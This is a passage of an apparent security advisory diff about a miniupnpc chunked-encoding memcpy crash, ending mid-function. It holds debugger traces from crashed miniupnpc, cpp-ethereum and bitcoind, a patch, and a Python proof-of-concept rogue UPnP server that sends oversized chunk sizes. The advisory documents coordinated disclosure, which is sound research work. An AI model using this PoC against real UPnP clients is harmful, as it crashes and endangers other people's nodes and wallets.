AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n3\r\nbye\r\n0'>
+[poc.py -               listen() ][    INFO] waiting for connection
+```
+
+
+#### A) miniupnpc v2.0
+
+```python
+[tin@localhost miniupnpc]$ gdb --args ./upnpc-static  -u http://192.168.2.104:65000/xxxx.xml -d -s
+...
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/tin/miniupnp/miniupnpc/./upnpc-static -u http://192.168.2.104:65000/xxxx.xml -d -s
+upnpc : miniupnpc library test client, version 2.0.
+ (c) 2005-2016 Thomas Bernard.
+Go to http://miniupnp.free.fr/ or http://miniupnp.tuxfamily.org/
+for more information.
+parsed url : hostname='192.168.2.104' port=65000 path='/xxxx.xml' scope_id=0
+address miniwget : 192.168.2.113
+header='Transfer-Encoding', value='chunked'
+chunked transfer-encoding!
+header='Content-Length', value='9041'                //#!  user provided content length (valid)
+Content-Length: 9041
+header='Content-Type', value='text/html'
+chunksize = 15 (f)
+chunksize = 2147483648 (80000000)                    //#!  user provided chunk size 0x80000000
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
+(gdb) up
+#1  0x000000000040897f in getHTTPResponse (s=s@entry=7, size=size@entry=0x7fffffffd59c, status_code=status_code@entry=0x0) at miniwget.c:306
+306          memcpy(content_buf + content_buf_used, buf + i, bytestocopy);
+(gdb) bt
+#0  0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
+#1  0x000000000040897f in getHTTPResponse (s=s@entry=7, size=size@entry=0x7fffffffd59c, status_code=status_code@entry=0x0) at miniwget.c:306
+#2  0x0000000000408d5c in miniwget3 (host=host@entry=0x7fffffffd500 "192.168.2.104", port=<optimized out>, path=0x7fffffffe73c "/xxxx.xml", size=size@entry=0x7fffffffd59c,
+    addr_str=addr_str@entry=0x7fffffffe320 "192.168.2.113", addr_str_len=addr_str_len@entry=64, httpversion=httpversion@entry=0x40b665 "1.1", scope_id=0, status_code=status_code@entry=0x0)
+    at miniwget.c:468
+#3  0x00000000004091f1 in miniwget2 (status_code=0x0, scope_id=<optimized out>, addr_str_len=64, addr_str=0x7fffffffe320 "192.168.2.113", size=0x7fffffffd59c, path=<optimized out>, port=<optimized out>,
+    host=0x7fffffffd500 "192.168.2.104") at miniwget.c:484
+#4  miniwget_getaddr (url=url@entry=0x7fffffffe722 "http://192.168.2.104:65000/xxxx.xml", size=size@entry=0x7fffffffd59c, addr=addr@entry=0x7fffffffe320 "192.168.2.113", addrlen=addrlen@entry=64,
+    scope_id=scope_id@entry=0, status_code=status_code@entry=0x0) at miniwget.c:659
+#5  0x00000000004043f1 in UPNP_GetIGDFromUrl (rootdescurl=rootdescurl@entry=0x7fffffffe722 "http://192.168.2.104:65000/xxxx.xml", urls=urls@entry=0x7fffffffd6a0, data=data@entry=0x7fffffffd790,
+    lanaddr=lanaddr@entry=0x7fffffffe320 "192.168.2.113", lanaddrlen=lanaddrlen@entry=64) at miniupnpc.c:708
+#6  0x0000000000401f69 in main (argc=<optimized out>, argv=0x7fffffffe478) at upnpc.c:690
+(gdb) i lo
+i = 30
+buf = "f\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 1418 times>...
+n = 1354
+endofheaders = 94
+chunked = 1                      //#!  chunked-encoding mode
+content_length = 9041            //#!  user provided content-length (valid)
+chunksize = 2147483648           //#!  user provided chunk-size (invalid, 0x80000000)
+bytestocopy = 2147483648         //#!  is our chunk-size. used in call to memcpy as the number of bytes to copy.
+header_buf = 0x610010 "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Length: 9041\r\nContent-Type: text/html\r\n\r\nf\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 76 times>...
+header_buf_len = 2048
+header_buf_used = 1448
+content_buf = 0x610820 "<xml>BOOM</xml>"
+content_buf_len = 9041           //#!  has been reallocated to content-length (otherwise this would be ~2k)
+content_buf_used = 15
+chunksize_buf = "\000\060\060\060\060\060\060\060\000\311\377\377\377\177\000\000\313\305@\000\000\000\000\000\005\000\000\000\000\000\000"
+chunksize_buf_index = 0
+reason_phrase = 0x0
+reason_phrase_len = 0
+```
+
+
+#### B) cpp-ethereum v1.3.0
+
+```python
+[tin@localhost ~]$ eth --version
+eth version 1.3.0
+eth network protocol version: 63
+Client database version: 12041
+Build: Linux/g++/Interpreter/RelWithDebInfo
+
+[tin@localhost miniupnpc]$ gdb --args eth -v 9
+...
+(gdb) r
+Starting program: /usr/bin/eth -v 9
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+cpp-ethereum, a C++ Ethereum client
+...  05:57:56 PM.351|eth  Reading /home/...
+â§ â
+    ¹  05:57:56 PM.358|eth  Id: ##013a7f1fâ¦
+[New Thread 0x7fffe6191700 (LWP 9306)]
+...  05:57:56 PM.371|eth  Opened blockchain DB. Latest: #5203fef2â¦ (rebuild not needed)
+[New Thread 0x7fffe5990700 (LWP 9307)]
+...  05:57:56 PM.374|eth  Opened state DB.
+[New Thread 0x7fffe4e2a700 (LWP 9308)]
+â§« â  05:57:56 PM.375|eth  startedWorking()
+cpp-ethereum 1.3.0
+  By cpp-ethereum contributors, (c) 2013-2016.
+  See the README for contributors and credits.
+Transaction Signer: XE50000000000000000000000000000000 (00000000-0000-0000-0000-000000000000 - 00000000)
+Mining Beneficiary: XE50000000000000000000000000000000 (00000000-0000-0000-0000-000000000000 - 00000000)
+Foundation: XE55PXQKKKXXXXXXXXT1XCYW6R5ELFAT6EM (00000000-0000-0000-0000-000000000000 - de0b2956)
+[New Thread 0x7fffd7fff700 (LWP 9309)]
+[New Thread 0x7fffd77fe700 (LWP 9310)]
+  â
+   ¹  05:58:00 PM.757|p2p  UPnP device: http://192.168.2.104:65000/xxxx.xml [st: urn:schemas-upnp-org:device:InternetGatewayDevice:1 ]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7fffd7fff700 (LWP 9309)]
+0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
+(gdb)
+#0  0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
+#1  0x00007ffff4a8bfce in getHTTPResponse () from /lib64/libminiupnpc.so.16
+#2  0x00007ffff4a8c43f in miniwget3.constprop.0 () from /lib64/libminiupnpc.so.16
+#3  0x00007ffff4a8c873 in miniwget () from /lib64/libminiupnpc.so.16
+#4  0x00007ffff62cb97f in dev::p2p::UPnP::UPnP() () from /lib64/libp2p.so
+#5  0x00007ffff633d2d0 in dev::p2p::Network::traverseNAT(std::set<boost::asio::ip::address, std::less<boost::asio::ip::address>, std::allocator<boost::asio::ip::address> > const&, unsigned short, boost::asio::ip::address&) () from /lib64/libp2p.so
+#6  0x00007ffff62eed05 in dev::p2p::Host::determinePublic() () from /lib64/libp2p.so
+#7  0x00007ffff62ef3b3 in dev::p2p::Host::startedWorking() () from /lib64/libp2p.so
+#8  0x00007ffff610e979 in dev::Worker::startWorking()::{lambda()#1}::operator()() const () from /lib64/libdevcore.so
+#9  0x00007ffff4831220 in ?? () from /lib64/libstdc++.so.6
+#10 0x00007ffff72cddc5 in start_thread () from /lib64/libpthread.so.0
+#11 0x00007ffff3f97ced in clone () from /lib64/libc.so.6
+```
+
+
+#### C) bitcoind 0.13.2 (windows)
+
+```c
+#> bitcoin-0.13.2\bin\bitcoind.exe -upnp -printtoconsole
+
+Bitcoin version v0.13.2
+...
+mapBlockIndex.size() = 1
+nBestHeight = 0
+setKeyPool.size() = 100
+mapWallet.size() = 0
+mapAddressBook.size() = 1
+init message: Loading addresses...
+torcontrol thread start
+Loaded 0 addresses from peers.dat  1ms
+init message: Loading banlist...
+init message: Starting network threads...
+upnp thread start
+init message: Done loading
+opencon thread start
+addcon thread start
+dnsseed thread start
+msghand thread start
+net thread start
+Loading addresses from DNS seeds (could take a while)
+132 addresses found from DNS seeds
+dnsseed thread exit
+receive version message: /Satoshi:0.13.1/: version xxxx, blocks=xxxxx, us=xxxxxx:57964, peer=1
+Pre-allocating up to position 0x100000 in rev00000.dat
+...
+<crash:upnp thread crashing with access violation>
+
+
+ //#! missing symbols - stacktrace not really useful.
+
+(5fdc.5d34): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for bitcoind.exe -
+bitcoind!secp256k1_ecdsa_recover+0x1ea44f:
+00000000`01615f1f f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
+0:016> !analyze -v -f
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
+
+
+FAULTING_IP:
+bitcoind!secp256k1_ecdsa_recover+1ea44f
+00000000`01615f1f f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
+
+EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 0000000001615f1f (bitcoind!secp256k1_ecdsa_recover+0x00000000001ea44f)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 0000000000000000
+   Parameter[1]: 0000000008db0000
+Attempt to read from address 0000000008db0000
+
+CONTEXT:  0000000000000000 -- (.cxr 0x0;r)
+rax=0000000008385900 rbx=00000000083848a0 rcx=0000000094964738
+rdx=0000000000000000 rsi=0000000008db0000 rdi=0000000008388472
+rip=0000000001615f1f rsp=0000000008dad3e0 rbp=00000000949672aa
+ r8=0000000008387c80  r9=0000000094967295 r10=0000000000000000
+r11=0000000008dacd00 r12=00000000949672b8 r13=00000000949672aa
+r14=00000000000005b4 r15=0000000000000556
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+bitcoind!secp256k1_ecdsa_recover+0x1ea44f:
+00000000`01615f1f f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
+
+FAULTING_THREAD:  0000000000005d34
+PROCESS_NAME:  bitcoind.exe
+ERROR_CODE: (NTSTATUS) 0xc0000005
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005
+EXCEPTION_PARAMETER1:  0000000000000000
+EXCEPTION_PARAMETER2:  0000000008db0000
+READ_ADDRESS:  0000000008db0000
+FOLLOWUP_IP:
+bitcoind!secp256k1_ecdsa_recover+1ea44f
+00000000`01615f1f f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
+APPLICATION_VERIFIER_FLAGS:  0
+APP:  bitcoind.exe
+ANALYSIS_VERSION: 6.3.9600.16384 (debuggers(dbg).130821-1623) amd64fre
+BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_READ_PROBABLYEXPLOITABLE
+PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_PROBABLYEXPLOITABLE
+DEFAULT_BUCKET_ID:  STRING_DEREFERENCE_PROBABLYEXPLOITABLE
+LAST_CONTROL_TRANSFER:  from 00000000016160f0 to 0000000001615f1f
+STACK_TEXT:
+00000000`08dad3e0 00000000`016160f0 : 00000000`00000754 00000000`00000754 00000000`00000000 00000000`0823af72 : bitcoind!secp256k1_ecdsa_recover+0x1ea44f
+00000000`08dadcd0 00000000`01616467 : 00000000`00000010 00007ffc`6a207185 00000000`00000000 00000000`00000010 : bitcoind!secp256k1_ecdsa_recover+0x1ea620
+00000000`08dae580 00000000`01612e97 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : bitcoind!secp256k1_ecdsa_recover+0x1ea997
+00000000`08dae650 00000000`0124a8fa : 00000000`08239840 00007ffc`a255cfb6 00000000`15040011 00000000`00000001 : bitcoind!secp256k1_ecdsa_recover+0x1e73c7
+00000000`08dae740 00000000`0165252a : 00000000`00000000 00000000`08230000 00000000`00000002 00000000`08daf980 : bitcoind+0x7a8fa
+00000000`08daf830 00000000`014567c5 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : bitcoind!secp256k1_ecdsa_recover+0x226a5a
+00000000`08daf940 00007ffc`a05cb2ba : 00000000`081abb90 00000000`00000000 00000000`00000000 00000000`00000000 : bitcoind!secp256k1_ecdsa_recover+0x2acf5
+00000000`08dafb50 00007ffc`a05cb38c : 00007ffc`a0620670 00000000`08237230 00000000`00000000 00000000`00000000 : msvcrt!beginthreadex+0x12a
+00000000`08dafb80 00007ffc`a0d28364 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : msvcrt!endthreadex+0xac
+00000000`08dafbb0 00007ffc`a25870d1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
+00000000`08dafbe0 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
+
+STACK_COMMAND:  .cxr 0x0 ; kb
+SYMBOL_STACK_INDEX:  0
+SYMBOL_NAME:  bitcoind!secp256k1_ecdsa_recover+1ea44f
+FOLLOWUP_NAME:  MachineOwner
+MODULE_NAME: bitcoind
+IMAGE_NAME:  bitcoind.exe
+FAILURE_BUCKET_ID:  STRING_DEREFERENCE_PROBABLYEXPLOITABLE_c0000005_bitcoind.exe!secp256k1_ecdsa_recover
+BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_READ_PROBABLYEXPLOITABLE_bitcoind!secp256k1_ecdsa_recover+1ea44f
+ANALYSIS_SOURCE:  UM
+FAILURE_ID_HASH_STRING:  um:string_dereference_probablyexploitable_c0000005_bitcoind.exe!secp256k1_ecdsa_recover
+```
+
+#### D) bitcoind 0.14.1 (linux)
+
+```python
+#> src\bitcoind -upnp -printtoconsole
+
+pwndbg> bt
+#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:36
+#1  0x00007ffff6abe91e in getHTTPResponse () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#2  0x00007ffff6abed22 in ?? () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#3  0x00007ffff6abf12d in miniwget_getaddr () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#4  0x00007ffff6ac0f9e in UPNP_GetValidIGD () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#5  0x000055555560ee0b in ThreadMapPort () at net.cpp:1446
+#6  0x0000555555622e44 in TraceThread<void (*)()> (name=0x555555a81767 "upnp", func=0x55555560ed3a <ThreadMapPort()>) at util.h:218
+#7  0x0000555555689c4e in boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> >::operator()<void (*)(char const*, void (*)()), boost::_bi::list0> (this=0x5555561544c0, f=@0x5555561544b8: 0x555555622dc2 <TraceThread<void (*)()>(char const*, void (*)())>, a=...) at /usr/include/boost/bind/bind.hpp:313
+#8  0x000055555568996a in boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > >::operator() (this=0x5555561544b8) at /usr/include/boost/bind/bind_template.hpp:20
+#9  0x00005555556896eb in boost::detail::thread_data<boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > > >::run (this=0x555556154300) at /usr/include/boost/thread/detail/thread.hpp:117
+#10 0x00007ffff753aaea in ?? () from /usr/lib/x86_64-linux-gnu/libboost_thread.so.1.55.0
+#11 0x00007ffff5c3a064 in start_thread (arg=0x7fffd97fa700) at pthread_create.c:309
+#12 0x00007ffff596f62d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
+```
+
+
+Mitigation / Workaround / Discussion
+-------------------------------------
+
+* update to miniupnpc-2.0.20170509.tar.gz
+* disable upnp
+* or apply the following patch (also see provided patch1.diff, patch2.diff)
+
+
+```diff
+--- a/miniupnpc/miniwget.c
++++ b/miniupnpc/miniwget.c
+@@ -280,11 +280,11 @@ getHTTPResponse(int s, int * size, int * status_code)
+                                                        goto end_of_stream;
+                                                }
+                                        }
+-                                       bytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);
++                                       bytestocopy = ((unsigned int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);
+                                        if((content_buf_used + bytestocopy) > content_buf_len)
+                                        {
+                                                char * tmp;
+-                                               if(content_length >= (int)(content_buf_used + bytestocopy)) {
++                                               if((unsigned int)content_length >= (content_buf_used + bytestocopy)) {
+                                                        content_buf_len = content_length;
+                                                } else {
+                                                        content_buf_len = content_buf_used + bytestocopy;
+@@ -309,14 +309,14 @@ getHTTPResponse(int s, int * size, int * status_code)
+                        {
+                                /* not chunked */
+                                if(content_length > 0
+-                                  && (int)(content_buf_used + n) > content_length) {
++                                  && (content_buf_used + n) > (unsigned int)content_length) {
+                                        /* skipping additional bytes */
+                                        n = content_length - content_buf_used;
+                                }
+                                if(content_buf_used + n > content_buf_len)
+                                {
+                                        char * tmp;
+-                                       if(content_length >= (int)(content_buf_used + n)) {
++                                       if((unsigned int)content_length >= (content_buf_used + n)) {
+                                                content_buf_len = content_length;
+                                        } else {
+                                                content_buf_len = content_buf_used + n;
+@@ -336,7 +336,7 @@ getHTTPResponse(int s, int * size, int * status_code)
+                        }
+                }
+                /* use the Content-Length header value if available */
+-               if(content_length > 0 && (int)content_buf_used >= content_length)
++               if(content_length > 0 && content_buf_used >= (unsigned int)content_length)
+                {
+ #ifdef DEBUG
+                        printf("End of HTTP content\n");
+```
+
+
+Notes
+-----
+
+* Vendor acknowledgement / Miniupnp Changelog [5]
+* Thanks to the miniupnp project for providing a fixed version within ~1 week!
+* This research/disclosure was coordinated in cooperation with the ethereum foundation at ethereum.org. Thanks, it was a pleasure working with you!
+
+
+References
+----------
+
+    [1] http://miniupnp.free.fr/
+    [2] http://miniupnp.free.fr/files/
+    [3] https://github.com/miniupnp/miniupnp/tree/master
+    [4] https://github.com/miniupnp/miniupnp/blob/master/miniupnpc/miniwget.c#L236
+    [5] http://miniupnp.free.fr/files/changelog.php?file=miniupnpc-2.0.20170509.tar.gz
+    [6] https://github.com/miniupnp/miniupnp/commit/f0f1f4b22d6a98536377a1bb07e7c20e4703d229
+
+
+Contact
+-------
+
+    https://github.com/tintinweb
+
+
+
+
+
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+# Author : <github.com/tintinweb>
+###############################################################################
+#
+# FOR DEMONSTRATION PURPOSES ONLY!
+#
+###############################################################################
+#
+#  gdb --args ./upnpc-static  -u http://192.168.2.110:5200/xxxx.xml -d -s    <- segfault
+#
+import socket
+import struct
+import logging
+import threading
+__version__ = 0.3
+
+logger = logging.getLogger(__name__)
+
+
+SCENARIO_CRASH_LARGE_MEMCPY = 1  # crash in memcpy with access violation READ (large memcpy)
+SCENARIO_CRASH_REALLOC_NULLPTR = 2  # miniupnpc <= v1.8 did not catch realloc errors
+SCENARIO_CRASH_1_BYTE_BUFFER = 3  # crash in memcpy overwriting heap (more likely crashing in read)
+SELECT_SCENARIO = SCENARIO_CRASH_LARGE_MEMCPY # default
+
+
+class HttpLikeMessage(object):
+    """
+    Builds and parses HTTP like message structures.
+    """
+    linebrk = '\r\n'
+
+    def __init__(self, raw):
+        self.raw = raw
+        self.header = self.request = self.method = self.path = self.protocol = self.body = None
+        self.parse_fuzzy_http(raw)
+
+    def startswith(self, other):
+        return self.raw.startswith(other)
+
+    def parse_fuzzy_http(self, data):
+        data = data.replace('\r', '')
+        try:
+            head, self.body = data.split("\n\n", 1)
+        except ValueError:
+            # no body
+            self.body = ''
+            head = data
+
+        try:
+            head_items = head.strip().split('\n')
+            self.request = head_items.pop(0)
+            self.method, self.path, self.protocol = self.request.split(" ")
+
+            self.header = {}
+            for k, v in (line.strip().split(':', 1) for line in head_items if head.strip()):
+                self.header[k.strip()] = v.strip()
+        except Exception, e:
+            logger.exception(e)
+            e.msg = data
+            raise e
+
+    def serialize(self):
+        lines = [self.request, ]
+        lines += ['%s: %s' % (k, v) for k, v in self.header.iteritems()]
+        return self.linebrk.join(lines) + self.linebrk * 2 + self.body
+
+    def __str__(self):
+        return self.serialize()
+
+    def __repr__(self):
+        return "<%s msg=%r header=%r body=%r>" % (self.__class__.__name__,
+                                                  (self.method, self.path, self.protocol),
+                                                  self.header,
+                                                  self.body)
+
+
+class UPnPListener(object):
+    def __init__(self, group="239.255.255.250", port=1900):
+        self.group, self.port = group, port
+        self.callbacks = {}
+        # multicast socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        logger.debug("[SSDP] bind: 0.0.0.0:%s" % port)
+        sock.bind(('0.0.0.0', port))
+        mreq = struct.pack("=4sl", socket.inet_aton(group), socket.INADDR_ANY)
+        logger.debug("[SSDP] add membership: UDP/%s" % group)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+        self.listening = False
+        self.sock = sock
+        self.devices = {}
+
+    # Start listening
+    def listen(self):
+        self.listening = True
+
+        # Hint: this should be on a thread ;)
+        logger.debug("[SSDP] listening...")
+        while self.listening:
+            try:
+                # Grab a large wad of data
+                data, peer = self.sock.recvfrom(10240)
+                data = data.decode("utf-8")
+                msg = HttpLikeMessage(data)
+                # msg = HttpLikeMessage(self.sock.recv(10240).decode('utf-8'))
+                logger.debug("[<-----] %r" % msg)
+
+                # execute callback if available
+                cb = self.callbacks.get(msg.method, None)
+                cb and cb(self, msg, peer)
+            except Exception, e:
+                logger.exception(e)
+
+    # Register the uuid to a name -- as an example ... I put a handler here ;)
+    def register_device(self, name="", uuid=""):
+        logger.debug("%s; %s" % (name, uuid))
+        if name == "" or uuid == "":
+            logger.error("[SSDP] Error registering device, check your name and uuid")
+            return
+
+        # Store uuid to name for quick search
+        self.devices[uuid] = name
+
+    def register_callback(self, name, f):
+        logger.debug("[SSDP] add callback for %r : %r" % (name, f))
+        self.callbacks[name] = f
+
+
+class BadHttpServer(threading.Thread):
+    def __init__(self, bind, filter=None):
+        threading.Thread.__init__(self)
+        self.bind = bind
+        self.filter = filter
+
+    def __repr__(self):
+        return "<%s bind=%s>" % (self.__class__.__name__,
+                                 repr(self.bind))
+
+    def run(self, ):
+        self.listen(filter=self.filter)
+
+    def listen(self, filter=None):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        logger.info("[HTTP] bind %s:%d"%self.bind)
+        sock.bind(self.bind)
+        # Listen for incoming connections
+        sock.listen(1)
+
+        while True:
+            # Wait for a connection
+            logger.info("[HTTP] waiting for connection")
+            connection, client_address = sock.accept()
+
+            try:
+                if filter and client_address[0] not in filter:
+                    raise Exception("[HTTP] wait for different client: %s!=%s" % (client_address[0], filter))
+                logger.info("[      ] connection from: %s" % repr(client_address))
+
+                chunks = []
+                # TODO refactor crappy code
+                while True:
+                    data = connection.recv(1024 * 8)
+                    if not data:
+                        break
+                    chunks.append(data)
+                    if data.endswith("\r\n\r\n"):
+                        break
+                logger.debug(data)
+                self.handle_request(client_address, connection, HttpLikeMessage(''.join(chunks)))
+            except Exception, e:
+                logger.warning(repr(e))
+            finally:
+                # Clean up the connection
+                connection.close()
+
+    def send(self, client, connection, chunks):
+        """
+
+        :param client:
+        :param chunks:
+        :param connection:
+        :return:
+        """
+        template = """HTTP/1.1 200 OK
+Content-Type: text/html
+"""
+        ans = HttpLikeMessage(template)
+        if len(chunks) == 1:
+            length, data = chunks[0]
+            ans.header["Content-Length"] = length or len(data)
+            ans.body = data
+        else:
+            ans.header["Transfer-Encoding"] = "chunked"
+            body = []
+            for chunk in chunks:
+                length, data = chunk
+                body.append("%x%s%s%s" % (length or len(data), ans.linebrk, data, ans.linebrk))
+            body.append("0")
+            ans.body = ''.join(body)
+            if SELECT_SCENARIO==SCENARIO_CRASH_LARGE_MEMCPY:
+                ans.header["Content-Length"] = len(ans.body)
+            elif SELECT_SCENARIO==SCENARIO_CRASH_1_BYTE_BUFFER:
+                # memcpy 0x80000000+x bytes to a buffer of 1 byte size.
+                ans.header["Content-Length"] = 1  # forces a realloc of 1 byte
+            else:
+                # realloc with 0x7fffffff, memcpy n=chunk_size:0x80000000+x - crashes if realloc fails
+                ans.header["Content-Length"] = 0x7fffffff  # forces a realloc of x bytes
+
+        connection.sendall(str(ans))
+        logger.debug(str(ans))
+        logger.warning("[----->] BOOM! payload delivered! - [to:%r] %r" % (client, ans))
+
+    def handle_request(self, client, connection, msg):
+        if False and "AddPortMapping" not in str(msg):
+            chunks = [(None, "<>")]
+        else:
